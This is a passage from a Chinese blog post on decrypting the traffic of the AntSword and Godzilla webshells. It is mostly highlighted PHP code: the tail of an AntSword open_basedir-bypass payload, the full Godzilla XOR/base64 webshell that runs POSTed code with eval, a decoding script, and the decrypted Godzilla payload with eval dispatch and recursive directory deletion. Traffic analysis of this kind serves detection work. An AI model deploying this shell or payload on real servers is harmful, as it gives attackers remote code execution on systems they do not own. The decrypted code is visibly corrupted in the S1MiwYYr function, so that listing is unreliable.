variable">$tmdir</span><span class="token operator">=</span><span class="token string double-quoted-string">".9f1e7fc86"</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$oparr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$ocwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> @<span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$output</span><span class="token operator">=</span><span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"358dc"</span><span class="token operator">.</span><span class="token string double-quoted-string">"5242b"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"79"</span><span class="token operator">.</span><span class="token string double-quoted-string">"e55"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"kid"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>哥斯拉自带了几种加密方式，这里以php为例：分别为PHP_EVEAL_XOR_BASE64、PHP_XOR_BASE64、PHP_XOR_RAW为例。</p><h3 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP_XOR_BASE64"></a>PHP_XOR_BASE64</h3><p>这个用哥斯拉生成的shell：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">encode</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据shell文件可以看出加密过程，先将pass传递内容base64解码，然后将内容与key进行异或操做，注意这里的key实际上是生成shell的key的32位md5的前16位。<br>那么我们根据这些即可写一个一次性的解码脚本，用第一次哥斯拉进行流量交互的payload为例（这里的key值为key）：<br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/2.2l7h0knmmfe0.png"><br>将内容url解码后放入脚本中<br>脚本如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token variable">$post</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token comment">#echo base64_decode($post);</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解密结果如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$parameters</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SES</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span><span class="token punctuation">(</span><span class="token variable">$pms</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">global</span> <span class="token variable">$ERRMSG</span><span class="token punctuation">;</span> <span class="token function">reDefSystemFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SES</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$sessioId</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$sessioId</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$_SES</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">S1MiwYYr</span><span class="token punctuation">(</span><span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$sessioId</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$sessioId</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$sessioId</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> @<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">canCallGzipDecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>@<span class="token function">isGzipStream</span><span class="token punctuation">(</span><span class="token variable">$pms</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$pms</span><span class="token operator">=</span><span class="token function">gzdecode</span><span class="token punctuation">(</span><span class="token variable">$pms</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token function">formatParameter</span><span class="token punctuation">(</span><span class="token variable">$pms</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"bypass_open_basedir"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_SES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"bypass_open_basedir"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">bypass_open_basedir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payloadErrorHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set_exception_handler"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">set_exception_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"payloadExceptionHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$result</span><span class="token operator">=</span>@<span class="token function">evalFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">==</span><span class="token keyword type-declaration">null</span><span class="token operator">||</span><span class="token variable">$result</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$ERRMSG</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SES</span><span class="token operator">!==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$sessioId</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">S1MiwYYr</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SES</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$sessioId</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">canCallGzipEncode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">gzencode</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">payloadExceptionHandler</span><span class="token punctuation">(</span><span class="token variable">$exception</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">global</span> <span class="token variable">$ERRMSG</span><span class="token punctuation">;</span> <span class="token variable">$ERRMSG</span><span class="token operator">.=</span><span class="token string double-quoted-string">"ExceptionMsg:"</span><span class="token operator">.</span><span class="token variable">$exception</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">payloadErrorHandler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$errcontext</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">global</span> <span class="token variable">$ERRMSG</span><span class="token punctuation">;</span> <span class="token variable">$ERRMSG</span><span class="token operator">.=</span><span class="token string double-quoted-string">"ErrLine: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$errline</span><span class="token punctuation">}</span></span> ErrorMsg:<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$errstr</span><span class="token punctuation">}</span></span>\r\n"</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">S1MiwYYr</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$istrlen</span><span class="token punctuation">(</span><span class="token variable">$pms</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">evalFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> @<span class="token function">session_write_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$className</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"codeName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$methodName</span><span class="token operator">=</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"methodName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SES</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$methodName</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$className</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$methodName</span><span class="token operator">==</span><span class="token string double-quoted-string">"includeCode"</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">includeCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SES</span><span class="token punctuation">[</span><span class="token variable">$className</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_SES</span><span class="token punctuation">[</span><span class="token variable">$className</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$className</span><span class="token punctuation">}</span></span> no load"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$methodName</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token variable">$methodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"function <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$methodName</span><span class="token punctuation">}</span></span> not exist"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string double-quoted-string">"methodName Is Null"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">function</span> <span class="token function-definition function">deleteDir</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$m</span><span class="token operator">=</span>@<span class="token function">dir</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token variable">$f</span><span class="token operator">=</span><span class="token variable">$m</span><span class="token operator">-&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$pf</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$f</span><span class="token punctuation">;</span> @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$pf</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$pf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">!=</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">!=</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">deleteDir</span><span class="token punctuation">(</span><span class="token variable">$pf</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$pf</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$pf</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">!=</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">!=</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 